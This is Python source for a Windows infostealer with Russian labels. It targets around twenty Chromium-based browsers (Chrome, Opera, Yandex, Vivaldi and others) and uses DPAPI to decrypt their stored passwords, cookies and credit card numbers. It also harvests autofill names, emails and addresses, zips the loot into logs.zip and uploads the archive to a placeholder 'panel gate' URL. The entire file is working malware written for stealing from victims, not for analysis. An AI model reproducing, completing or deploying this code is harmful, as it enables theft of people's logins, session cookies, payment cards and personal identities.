

import sqlite3
import sys
import os
import winreg
import zipfile
from re import findall
from shutil import copy2


from helpers import *
from dpapi import Win32CryptUnprotectData


#====================================#
#             переменные             #
#====================================#


pathusr = os.path.expanduser('~')


browser_chrome = {    
        'google_chrome': pathusr + "\\AppData\\Local\\Google\\Chrome\\User Data\\",
        'google_chromex86': pathusr + "\\AppData\\Local\\Google (x86)\\Chrome\\User Data\\",
        'vivaldi': pathusr + "\\AppData\\Local\\Vivaldi\\User Data\\",
        'opera': pathusr + "\\AppData\\Roaming\\Opera Software\\",
        'kometa': pathusr + "\\AppData\\Local\\Kometa\\User Data\\",
        'orbitum': pathusr + "\\AppData\\Local\\Orbitum\\User Data\\",
        'comodo_dragon': pathusr + "\\AppData\\Local\\Comodo\\Dragon\\User Data\\",
        'amigo': pathusr + "\\AppData\\Local\\Amigo\\User\\User Data\\",
        'torch': pathusr + "\\AppData\\Local\\Torch\\User Data\\",
        'yandex': pathusr + "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\",
        'comodo': pathusr + "\\AppData\\Local\\Comodo\\User Data\\",
        '360br': pathusr + "\\AppData\\Local\\360Browser\\Browser\\User Data\\",
        'maxtron': pathusr + "\\AppData\\Local\\Maxthon3\\User Data\\",
        'kmelon': pathusr + "\\AppData\\Local\\K-Melon\\User Data\\",
        'chromium': pathusr + "\\AppData\\Local\\Chromium\\User Data\\",
        'sputnik': pathusr + "\\AppData\\Local\\Sputnik\\Sputnik\\User Data\\",
        'nichrome': pathusr + "\\AppData\\Local\\Nichrome\\User Data\\",
        'coccoc': pathusr + "\\AppData\\Local\\CocCoc\\Browser\\User Data\\",
        'uran': pathusr + "\\AppData\\Local\\Uran\\User Data\\",
        'chromodo': pathusr + "\\AppData\\Local\\Chromodo\\User Data\\",
                }


profiles_chrome = {
        'profile1': 'Profile 1\\', 
        'profile2': 'Profile 2\\', 
        'profile3': 'Profile 3\\', 
        'default': 'Default\\', 
        'opera': 'Opera Stable\\'
                }


db  = pathusr + "\\db1"
db2 = pathusr + "\\db2"
db3 = pathusr + "\\db3"


#====================================#
#               функции              #
#====================================#


def login_chrome(file):
    count = 0
    logindata = "============логины=============\r\n"
    copy2(file, db)
    con = sqlite3.connect(db)
    cursor = con.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value from logins;")
    for origin_url, username_value, password_value in cursor.fetchall():
        password = Win32CryptUnprotectData(password_value).decode("utf-8")
        if password is not False:
            if origin_url is not '':
                logindata += 'САЙТ : ' + str(origin_url) + '\r\n'
            if username_value is not '':
                logindata += 'ЛОГ  : ' + str(username_value)  + '\r\n'
            if password_value is not '':
                logindata += 'ПАСС : ' + str(password) + '\r\n\r\n'
                count += 1
    return(count, logindata)


def cook_chrome(file):
    count = 0
    cookdata = "============печени=============\r\n"
    copy2(file, db2)
    con = sqlite3.connect(db2)
    cursor = con.cursor()
    cursor.execute("SELECT host_key, name, value, path, last_access_utc, encrypted_value \
        FROM cookies;")
    for host_key, name, value, path, last_access_utc, encrypted_value in cursor.fetchall():
        decrypted = Win32CryptUnprotectData(encrypted_value).decode("utf-8") or value or 0
        if decrypted is not False:
            cookdata += str(host_key) + "\tTRUE\t" + "/" + '\tFALSE\t' + str(last_access_utc) + '\t' + \
            str(name) + '\t' + str(decrypted) + '\n'
            count += 1
    return(count, cookdata)


def web_chrome(file):
    count = 0
    webdata = "============деньги=============\r\n"
    copy2(file, db3)
    con = sqlite3.connect(db3)
    cursor = con.cursor()
    cursor.execute("SELECT name_on_card, expiration_month, expiration_year,\
     card_number_encrypted, billing_address_id FROM credit_cards;")
    for name_on_card, expiration_month, expiration_year,\
    card_number_encrypted, billing_address_id in cursor.fetchall():
        decrypted = Win32CryptUnprotectData(card_number_encrypted).decode("utf-8")
        if decrypted is not False:
            if name_on_card is not '':
                webdata += 'ИМЯ КАРТХОЛДЕРА: ' + name_on_card + '\r\n'
            if expiration_month is not '':
                webdata += 'МЕСЯЦ: ' + expiration_month + '\r\n'
            if expiration_year is not '':
                webdata += 'ГОД: ' + expiration_year + '\r\n'
            if card_number_encrypted is not '':
                webdata += 'НОМЕР КАРТЫ: ' + decrypted + '\r\n'
            if billing_address_id is not '':
                webdata += 'БИЛЛИНГ: ' + billing_address_id + '\r\n\r\n'

 
    cursor.execute("SELECT guid, company_name, street_address,\
     dependent_locality, city, state, zipcode, sorting_code,\
     country_code, date_modified, origin, language_code,\
     use_count, use_date, validity_bitfield FROM autofill_profiles")

    for company_name, street_address,\
     dependent_locality, city, state, zipcode, sorting_code,\
     country_code, date_modified, origin, language_code,\
     use_count, use_date, validity_bitfield in cursor.fetchall():
        webdata += "============информ=============\r\n"
        if company_name is not '':
            webdata += company_name + '\r\n'
        if street_address is not '':
            webdata += street_address + '\r\n'
        if dependent_locality is not '':
            webdata += dependent_locality + '\r\n'
        if city is not '':
            webdata += city + '\r\n'
        if state is not '':
            webdata += state + '\r\n'
        if zipcode is not '':
            webdata += zipcode + '\r\n'
        if sorting_code is not '':
            webdata += sorting_code + '\r\n'
        if country_code is not '':
            webdata += country_code + '\r\n'
        if date_modified is not '':
            webdata += date_modified + '\r\n'
        if origin is not '':
            webdata += origin + '\r\n'
        if language_code is not '':
            webdata += language_code + '\r\n'
        if use_count is not '':
            webdata += use_count + '\r\n'
        if use_date is not '':
            webdata += use_date + '\r\n'
        if validity_bitfield is not '':
            webdata += validity_bitfield + '\r\n'
        if company_name is not '':
            count += 1
            webdata += '\r\n\r\n'


    cursor.execute("SELECT email FROM autofill_profile_emails")
    for email in cursor.fetchall():
        webdata += "============имейлы=============\r\n"
        if email is not '':
            webdata += email + '\r\n'
            count += 1


    cursor.execute("SELECT first_name, middle_name, last_name,\
     full_name FROM autofill_profile_names")
    for first_name, middle_name, last_name, full_name in cursor.fetchall():
        webdata += "============деанон=============\r\n"
        if first_name is not '':
            webdata += first_name + '\r\n'
        if middle_name is not '':
            webdata += middle_name + '\r\n'
        if last_name is not '':
            webdata += last_name + '\r\n'
        if full_name is not '':
            webdata += full_name + '\r\n'
            count += 1

    return(count, webdata)

def getXpom(savefolder):
    countpass, countcook, countdata = 0, 0, 0
    for browser_key, browser_folder in browser_chrome.items():
        if check_exists(browser_folder):
            for profile_key, profile_folder in profiles_chrome.items():
                if check_exists(browser_folder+profile_folder):
                    if check_exists(browser_folder+profile_folder+"\\Login Data"):
                        try:
                            countpass, logindata = login_chrome(browser_folder+profile_folder+"\\Login Data")
                            with open(savefolder + '\\' + browser_key+"_"+profile_key+'_logins.txt', "w")\
                             as file:
                                file.write(logindata)
                        except Exception as e:
                            countpass += 0

                    if check_exists(browser_folder+profile_folder+"\\Cookies"):
                        try:
                            countcook, cookdata = cook_chrome(browser_folder+profile_folder+"\\Cookies")
                            with open(savefolder + '\\' + browser_key+"_"+profile_key+'_cookie.txt', "w")\
                             as file:
                                file.write(cookdata)
                        except Exception as e:
                            countcook += 0

                    if check_exists(browser_folder+profile_folder+"\\Web Data"):
                        try:
                            countdata, webdata = web_chrome(browser_folder+profile_folder+"\\Web Data")
                            with open(savefolder + '\\' + browser_key+"_"+profile_key+'_ccdata.txt', "w")\
                             as file:
                                file.write(webdata)
                        except Exception as e:
                            countdata += 0
    
    return(countpass, countcook, countdata)


if __name__ == '__main__':


    if not check_exists('браузеры//'):
        os.mkdir('браузеры//')
    print(getXpom('браузеры//'))


    zipf = zipfile.ZipFile('logs.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('браузеры//', zipf)
    zipf.close()


    url = 'ВАШАПАНЕЛЬ_ГЕЙТ' 
    files = {'file': open('logs.zip', 'rb')}
    requests.post(url, files=files)
